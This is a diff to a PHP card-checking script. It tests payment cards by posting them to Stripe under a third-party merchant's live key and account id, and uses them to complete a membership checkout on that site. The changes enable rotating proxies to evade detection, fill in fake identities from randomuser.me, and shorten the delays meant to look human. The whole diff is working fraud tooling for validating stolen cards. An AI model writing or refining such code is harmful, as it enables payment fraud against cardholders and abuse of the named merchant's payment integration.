@@ -87,8 +87,8 @@ $number4 = substr($cc, 12, 4);
 $number6 = substr($cc, 0, 6);
 
 // Fetch random user data with delay
-//$proxy = rebootproxys();
-//list($proxyIP, $proxyPort, $proxyUser, $proxyPass) = explode(':', $proxy);
+$proxy = rebootproxys();
+list($proxyIP, $proxyPort, $proxyUser, $proxyPass) = explode(':', $proxy);
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
@@ -97,17 +97,21 @@ curl_setopt($ch, CURLOPT_COOKIE, 1);
 curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-//curl_setopt($ch, CURLOPT_PROXY, "http://$proxyIP:$proxyPort");
-//curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$proxyUser:$proxyPass");
 $resposta = curl_exec($ch);
-$firstname = value($resposta, '"first":"', '"');
-$lastname = value($resposta, '"last":"', '"');
-$phone = value($resposta, '"phone":"', '"');
-$zip = value($resposta, '"postcode":', ',');
-$state = value($resposta, '"state":"', '"');
-$email = value($resposta, '"email":"', '"');
-$city = value($resposta, '"city":"', '"');
-$street = value($resposta, '"street":"', '"');
+
+$data = json_decode($resposta, true);
+
+$firstname = $data['results'][0]['name']['first'];
+$lastname = $data['results'][0]['name']['last'];
+$phone = $data['results'][0]['phone'];
+$zip = $data['results'][0]['location']['postcode'];
+$state = $data['results'][0]['location']['state'];
+$email = $data['results'][0]['email'];
+$city = $data['results'][0]['location']['city'];
+$street = $data['results'][0]['location']['street']['name'];
+
+// Optional: simulate user delay
+
   // Pause to simulate a break in user action
 
 
@@ -153,7 +157,7 @@ curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
 
 // Insert simulated delay before posting form data
- sleep(rand(1, 3)); // A longer delay to simulate a pause before submission
+ sleep(rand(1, 2)); // A longer delay to simulate a pause before submission
 
 curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=152936c2-270c-42fc-8b9b-419d347c8a677f80b9&muid=02cd223f-04ec-4dfa-a540-2b81f331208f00654f&sid=b8bbc87d-975f-4c4f-9c58-9906dbd1324f3210fb&pasted_fields=number&payment_user_agent=stripe.js%2Ff52291c812%3B+stripe-js-v3%2Ff52291c812%3B+split-card-element&referrer=https%3A%2F%2Fwww.doane.us&time_on_page=222764&client_attribution_metadata[client_session_id]=6c5b71b2-d127-4258-8145-85b5c7f1c25e&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_1a4WfCRJEoV9QNmww9ovjaR2Drltj9JA3tJEWTBi4Ixmr8t3q5nDIANah1o0SdutQx4lUQykrh9bi3t4dR186AR8P00KY9kjRvX&_stripe_account=acct_168hGFAoD6Z5UbBG');
 
@@ -187,7 +191,7 @@ curl_setopt($ch, CURLOPT_HTTPHEADER, array(
     'x-requested-with: XMLHttpRequest',
 ));
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'pmpro_level=2&checkjavascript=1&pmpro_other_discount_code=&username='.$rnd.'tt3&password='.$name.'99007%40&password2='.$name.'99007%40&first_name='.$firstname.'&last_name='.$lastname.'&bemail='.$rnd.'w'.$firstname.'g%40gmail.com&bconfirmemail='.$rnd.'w'.$firstname.'g%40gmail.com&fullname=&pmpropp_chosen_plan=2&CardType=mastercard&pmpro_discount_code=&tos=1&pmpro_checkout_nonce='.$nonce.'&_wp_http_referer=%2Fmembership-account-new%2Fmembership-checkout%2F&submit-checkout=1&javascriptok=1&payment_method_id='.$id.'&AccountNumber='.$cc.'&ExpirationMonth='.$mes.'&ExpirationYear='.$ano.'');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'pmpro_level=2&checkjavascript=1&pmpro_other_discount_code=&username='.$rnd.'t'.$lastname.'&password='.$lastname.'99007%40&password2='.$lastname.'99007%40&first_name='.$firstname.'&last_name='.$lastname.'&bemail='.$rnd.'w'.$firstname.'g%40gmail.com&bconfirmemail='.$rnd.'w'.$firstname.'g%40gmail.com&fullname=&pmpropp_chosen_plan=2&CardType=mastercard&pmpro_discount_code=&tos=1&pmpro_checkout_nonce='.$nonce.'&_wp_http_referer=%2Fmembership-account-new%2Fmembership-checkout%2F&submit-checkout=1&javascriptok=1&payment_method_id='.$id.'&AccountNumber='.$cc.'&ExpirationMonth='.$mes.'&ExpirationYear='.$ano.'');
 $result2 = curl_exec($ch);
 $cvc_check = trim(strip_tags(GetStr($result2, '"cvc_check":"', '"')));
 $info = curl_getinfo($ch);
@@ -717,5 +721,3 @@ flush();
 //echo "<b>2REQ Result:</b> $result2<br><br>";
 
 ?>
-
-
